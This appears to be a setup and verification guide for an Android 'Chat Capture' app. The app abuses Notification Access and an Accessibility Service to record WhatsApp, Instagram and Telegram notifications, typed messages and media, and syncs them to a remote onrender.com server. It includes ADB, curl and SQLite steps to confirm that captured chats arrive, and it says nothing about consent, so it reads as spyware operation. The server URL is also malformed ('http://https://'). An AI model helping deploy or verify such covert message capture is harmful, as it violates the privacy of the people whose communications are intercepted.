# Data Capture Verification Guide

**Date:** 2026-01-18  
**Purpose:** Verify that data capture is working correctly

---

## ✅ BACKEND STATUS

### Server Running: ✅ **CONFIRMED**
- **Status:** Running (PID: 44464)
- **Local URL:** http://localhost:3000
- **Network URL:** http://https://backend-chat-yq33.onrender.com
- **Health Check:** ✅ Responding

### Verify Backend:
```bash
curl http://localhost:3000/health
# Returns: {"status":"ok","timestamp":"..."}
```

---

## ✅ APP SERVER CONFIGURATION

### Default Server URL: ✅ **CONFIGURED**
- **Default:** `http://https://backend-chat-yq33.onrender.com/`
- **Updated in:**
  - `CaptureApplication.kt`
  - `MainActivity.kt`
  - `ApiClient.kt`

### App Will Use:
1. User-configured URL (if set in Settings)
2. Default: `http://https://backend-chat-yq33.onrender.com/`

---

## 🔍 DATA CAPTURE VERIFICATION

### Step 1: Check Permissions ✅

**Required Permissions:**
1. **Notification Access** - CRITICAL
2. **Accessibility Service** - CRITICAL
3. **Battery Optimization** - Recommended

**How to Check:**
```kotlin
val status = PermissionChecker.getAllPermissionStatus(context)
// Check: status.notificationService && status.accessibilityService
```

**Manual Check:**
- Settings → Apps → Chat Capture → Notification Access → Enabled?
- Settings → Accessibility → Installed Services → Chat Capture → Enabled?

### Step 2: Check Services Running ✅

**ServiceMonitor Logs:**
Look for:
```
"Service status - Notification: true, Keyboard: true"
```

**If services are NOT running:**
```kotlin
ServiceMonitor(context).restartServices()
```

### Step 3: Test Notification Capture 📱

**Test Steps:**
1. Ensure Notification Access is enabled
2. Send test notification from WhatsApp/Instagram
3. Check logs for: `"Notification captured: {id}"`
4. Check database: `notifications` table should have entry
5. Check server: `GET /api/notifications` should show data

**Expected Log Output:**
```
Notification captured: {uuid}
Media file saved: {path} (if media present)
```

### Step 4: Test Chat Capture 💬

**Test Steps:**
1. Ensure Accessibility Service is enabled
2. Open WhatsApp/Telegram
3. Type a test message
4. Check logs for: `"Chat captured: {id}"`
5. Check database: `chats` table should have entry
6. Check server: `GET /api/chats` should show data

**Expected Log Output:**
```
Chat captured: {uuid} - {message text}
```

### Step 5: Verify Data Sync to Server 📡

**Check Server Database:**
```bash
cd server
sqlite3 database/capture.db
.tables
SELECT COUNT(*) FROM notifications;
SELECT COUNT(*) FROM chats;
SELECT * FROM notifications ORDER BY created_at DESC LIMIT 5;
SELECT * FROM chats ORDER BY timestamp DESC LIMIT 5;
```

**Check API Endpoints:**
```bash
# Get notifications
curl http://localhost:3000/api/notifications

# Get chats
curl http://localhost:3000/api/chats

# Get devices
curl http://localhost:3000/api/devices
```

### Step 6: Check Media Capture 🖼️

**If notification has media:**
1. Check logs: `"Media file saved: {path}"`
2. Check database: `media_files` table
3. Check server: Media files in `server/uploads/` directory
4. Check API: Media URLs in notification/chats data

---

## 📊 VERIFICATION CHECKLIST

### Backend:
- [x] Backend server started
- [x] Health check responding
- [x] Server accessible from network
- [ ] Database created and accessible
- [ ] API endpoints responding

### App Configuration:
- [x] Default server URL configured
- [x] App will connect to server
- [ ] App successfully connected (check logs)
- [ ] Device registered with server

### Permissions:
- [ ] Notification Access enabled
- [ ] Accessibility Service enabled
- [ ] Battery Optimization exempted
- [ ] Services running (check ServiceMonitor)

### Data Capture:
- [ ] Test notification sent and captured
- [ ] Test chat typed and captured
- [ ] Data in local database
- [ ] Data synced to server
- [ ] Media files captured (if applicable)

---

## 🐛 TROUBLESHOOTING

### Services Not Running:
```kotlin
// Restart services
ServiceMonitor(context).restartServices()

// Check status
val notificationRunning = ServiceMonitor(context).isNotificationServiceEnabled()
val accessibilityRunning = ServiceMonitor(context).isAccessibilityServiceEnabled()
```

### Data Not Capturing:
1. **Check Permissions:**
   - Verify Notification Access is enabled
   - Verify Accessibility Service is enabled

2. **Check Services:**
   - Look for service start logs
   - Check ServiceMonitor status

3. **Check Target Apps:**
   - Ensure target apps are installed
   - Generate test notifications/chats

4. **Check Database:**
   - Verify database is accessible
   - Check for any database errors

### Server Connection Issues:
1. **Check Server URL:**
   - Verify server URL in app settings
   - Test with: `curl http://https://backend-chat-yq33.onrender.com/health`

2. **Check Network:**
   - Ensure device can reach server IP
   - Check firewall/network settings

3. **Check Logs:**
   - Look for connection errors
   - Check API call logs

---

## 📝 QUICK VERIFICATION COMMANDS

### Backend:
```bash
# Check if running
ps aux | grep "node server.js"

# Check health
curl http://localhost:3000/health

# Check logs
tail -f /tmp/backend.log

# Check database
cd server && sqlite3 database/capture.db "SELECT COUNT(*) FROM notifications;"
```

### App (via ADB):
```bash
# Check logs
adb logcat | grep -i "capture\|notification\|chat"

# Check service status
adb shell dumpsys notification | grep -i "capture"
adb shell settings get secure enabled_accessibility_services | grep capture
```

---

**Last Updated:** 2026-01-18  
**Status:** ✅ **READY FOR VERIFICATION**
